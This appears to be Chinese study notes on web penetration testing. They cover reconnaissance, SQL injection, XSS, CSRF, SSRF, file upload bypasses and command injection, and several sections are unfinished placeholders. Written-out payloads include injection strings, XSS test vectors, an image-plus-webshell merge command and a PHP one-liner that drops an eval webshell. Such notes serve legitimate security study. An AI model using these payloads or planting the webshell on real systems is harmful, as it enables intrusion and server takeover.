## 第1章 渗透测试之信息收集

### 1.收集域名信息

Whois查询：在Kali中Whois已经默认安装，只需输入要查询的域名即可，也可以通过站长之家等在线查询网站查询。

备案信息查询：ICP备案查询网、天眼查

收集敏感信息：

使用Google的常用语法搜集一些敏感信息

| 关键字   | 说明                                             |
| -------- | ------------------------------------------------ |
| Site     | 指定域名                                         |
| Inurl    | URL中存在关键字的网页                            |
| Intext   | 网页正文中的关键字                               |
| Filetype | 指定文件类型                                     |
| Intitle  | 网页标题中的关键字                               |
| link     | link:baidu.com即返回所有和baidu.com做了链接的URL |
| Info     | 查找指定站点的一些基本信息                       |
| cache    | 搜索Google里关于某些内容的缓存                   |

### 2.收集子域名信息

子域名检测工具：常用的工具有Layer子域名挖掘机、Sublist3r和subDomainsBrute等。

搜索引擎枚举：使用site语法列举子域名。

### 3.收集常用端口信息

To Do：Nmap的使用场景和常用端口的功能与攻击实例

### 4.收集敏感目录文件

To Do：网站目录扫描工具的用例

## 第2章 搭建漏洞环境及实战

To Do：实践搭建和攻击过程

## 第3章 常用的渗透测试工具

To Do：SQLmap等工具的安装和实践

## 第4章 Web安全原理剖析

### 1.SQL注入

#### information_schema数据库

在该库中，有三个重要的表名，分别是SCHEMATA、TABLES和COLUMNS。

SCHEMATA表存储该用户创建的所有数据库的库名，该表中记录数据库库名的字段名为SCHEMA_NAME。

TABLES表存储该用户创建的所有数据库的库名和表名，该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。

COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名，该表中记录数据库库名、表名和字段名的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。

#### limit的用法

limit的使用格式为limit m,n，其中m是指记录开始的位置，从0开始，表示第1条记录，n是指取n条记录。

#### 注释和内联注释

在mysql中，常见的注释符的表达方式：#或--空格或/**/。

内联注释的形式：/*! code */。内联注释可以用于整个SQL语句中用来执行我们的SQL语句，例如：

```php
index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
```

#### 布尔注入的用法

可以通过数据库操作函数判断数据库名长度、字符、字段名和条目内容等信息。

```php
?id = 1' and length(database()) >= 5#
```

利用截取函数获取数据库的库名，与limit不同的是，substr函数从1开始排序，可以使用Burp功能或python自动化脚本实施爆破。

```php
?id = 1' and substr(database(),1,1) = 't'#
```

对于一些过滤手段，可以使用ASCII码进行查询，如s的ASCII码是115，转换函数为ord，可以修改语句为

```php
?id = 1' and ord(substr(database(),1,1)) = 115#
```

用查询语句替换database()即可爆破其他内容。

```php
?id = 1' and substr((select table_name from information_schema.tables where table_schema = 'sql' limit 0,1),1,1) = 'e'#
```

#### 报错注入的用法

```php
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'test' limit 0,1),0x7e),1)#
```

#### 时间盲注的用法

```sql
select * from users where 'id' = '1' and if(ord(substring(user(),1,1))=114,sleep(3),1)#
```

#### 堆叠注入的用法

堆叠查询可以执行多条语句，多语句之间以分号隔开。

```php
id = 1';select if(substr(user(),1,1) = 'r',sleep(3),1)#
```

使用PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。

```sql
SELECT * FROM users where 'id' = '1';select if(ord(substring(user(),1,1)) = 114,sleep(3),1);#
```

#### 其他注入的原理和案例

To Do：二次注入攻击、宽字节注入攻击、cookie注入攻击、base64攻击

#### SQL注入绕过技术

大小写绕过注入、双写绕过注入、编码绕过注入（通常需要两次URL编码）

多参数请求拆分：对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。例如请求URL时，GET参数为如下格式：a=[input1]&b=[input2]，将GET的参数a和参数b拼接到SQL语句中，SQL语句为and a=[input1] and b=[input2]。这时可以将注入语句进行拆分，如`a=union/*&b=*/select 1,2,3,4`，最终得到的SQL语句为`and a=union /*and b=*/select 1,2,3,4`。

### 2.XSS攻击

#### XSS漏洞原理

1. 反射型XSS：又称非持久型XSS，这种攻击方式往往具有一次性。攻击者通过电子邮件等方式将包括XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。
2. 存储型XSS：又称持久型XSS，攻脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。
3. DOM型XSS：全称Document Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。用户请求一个经过专门设计的URL，由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。

#### XSS常用语句及编码绕过

XSS常用的测试语句有：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

常见的XSS的绕过编码有JS编码、HTML实体编码和URL编码。

### 3.CSRF漏洞

#### CSRF漏洞的原理

CSRF（Cross-site request forgery，跨站请求伪造）也被称为One Click Attack或者Session Riding，与XSS非常不同的是，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF的攻击过程有以下两个重点：1、目标用户已经登录了网站，能够执行网站的功能。2、目标用户访问了攻击者构造的URL。

### 4.SSRF漏洞

#### SSRF漏洞的原理

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能够请求到与自身相连而与外网隔离的内部系统）。SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。

主要攻击方式如下：

- 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
- 攻击运行在内网或本地的应用程序。
- 利用file协议读取本地文件等。

### 5.文件上传漏洞

#### 文件上传漏洞的原理

上传文件时，如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件等，非法用户可以利用上传的恶意脚本文件控制整个网站甚至控制服务器，这个恶意的脚本文件又被称为WebShell。

#### JS检测绕过攻击

JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹框告知，此时上传文件的数据包并没有发送到服务端，只是在客户端浏览器使用JavaScript对数据包进行检测，通常有两种方法可以绕过客户端JavaScript的检测。

- 使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。
- 首先把需要上传文件的后缀改为允许上传的jpg等，绕过JS的检测，再通过bp抓包把后缀名改为可执行文件的后缀即可上传。

```javascript
function selectFile(fnUpload){
  var filename = fnUpload.value;
  var mime = filename.toLowerCase().substr(filename.lastIndexof("."));
  if(mime!=".jpg"){
    alert("请选择jpg格式的照片上传");
    fnUpload.outerHTML=fnUpload.outerHTML;
  }
}
```

#### 文件后缀绕过攻击

文件后缀绕过攻击是服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果配置有如下代码，则能够解析php和phtml文件。

```php
AddType application/x-httpd-php	.php	.phtml
```

在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀php。遇到服务端处理上传文件对php进行过滤时可以考虑利用Apache解析顺序或上传phtml等后缀的文件绕过该代码限制。

```php
$info=pathinfo($_FILES["file"]["name"]);
$ext=$info['extension'];//得到文件扩展名
if(strtolower($ext) == 'php'){
  exit("不允许的后缀名");
}
```

#### 文件类型绕过攻击

在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg。如果服务端代码是通过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值是通过客户端传递的，是可以任意修改的。所以当上传一个php文件时，在bp中将Content-Type修改再重发，就可以绕过服务端的检测。

```php
	if(($_FILES["file"]["type"] != "image/gif")&&($_FILES["file"]["type"] != "image/jpeg")&&($_FILES["file"]["type"] != "image/pjpeg"))
{
    exit($_FILES["file"]["type"]);//客户端请求数据包中的Content-Type
    exit("不允许的格式");
}
```

在PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么函数就获取不到信息，则不允许上传。

```php
if(!getimagesize($_FILES["file"]["tmp_name"])){
  exit("不允许的文件");
}
```

但是，我们可以将一个图片和一个WebShell合并为一个文件，例如使用以下命令，这样就能绕过函数，也能被解析为脚本文件。

```shell
cat image.png webshell.php > image.php
```

#### 文件截断绕过攻击

在一些早期的PHP版本，可以使用%00对文件名进行截断，如上传1.php%00.jpg文件，后缀名被识别为jpg，但是由于%00会阶段后面的内容，文件会以1.php的名字保存到服务器上。

#### 竞争条件攻击

一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差，攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。例如，攻击者先上传一个WebShell脚本10.php，10.php的内容是生成一个新的WebShell脚本shell.php。

```php
<?php
  fputs(fopen('../shell.php','w'),'<?php @eval($_POST[a]) ?>');
?>
```

### 6.命令执行攻击

#### 命令执行漏洞原理

应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。常用的Linux管道符如下：

- ";"：执行完前面的语句再执行后面的。
- "|"：显示后面语句的执行结果。
- "||"：当前面的语句执行出错时，执行后面的语句。
- "&"：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。
- "&&"：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。

